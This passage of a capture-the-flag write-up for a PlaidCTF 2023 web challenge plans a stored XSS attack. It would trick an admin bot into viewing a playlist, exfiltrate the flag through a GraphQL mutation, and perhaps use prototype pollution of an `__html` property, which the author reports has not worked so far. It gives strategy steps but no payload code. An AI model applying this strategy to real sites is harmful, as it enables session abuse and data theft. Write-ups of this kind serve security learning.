3. Send a POST request to GrahpQL endpoint, query the `report` mutation query, so that the admin bot can visit our user's profile's playlist, which will then trigger our XSS payload

However, in part 2, we need to find an another way to execute our XSS payload?

**In the playlist, we can add some episodes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416185224.png)

Let's add some of them!

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416185332.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416185456.png)

**Also, I noticed something interesting when I select the next episode:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/PlaidCTF-2023/images/Pasted%20image%2020230416185739.png)

Hmm... `constructor.prototype`, `__proto__`... I can smell some prototype pollutions!

The `renderHtml` function in `server/src/renderHtml.mts` returns object `HtmlString`, with property `__html`.

I wonder if can we **pollute the `__html` property**, and then executing our XSS payload...

Maybe we need to:
1. Create an account
2. Somehow pollute the `__html` property in object `HtmlString`??
3. Create a new playlist that contains the XSS payload, which sends a POST request to GrahpQL endpoint, query the flag mutation query, and exfiltrate the flag
4. Send a POST request to GrahpQL endpoint, query the report mutation query, so that the admin bot can visit our user's profile's playlist, which will then trigger our XSS payload

However, I tried to pollute any property with those `constructor`, `__proto__`, but no luck...
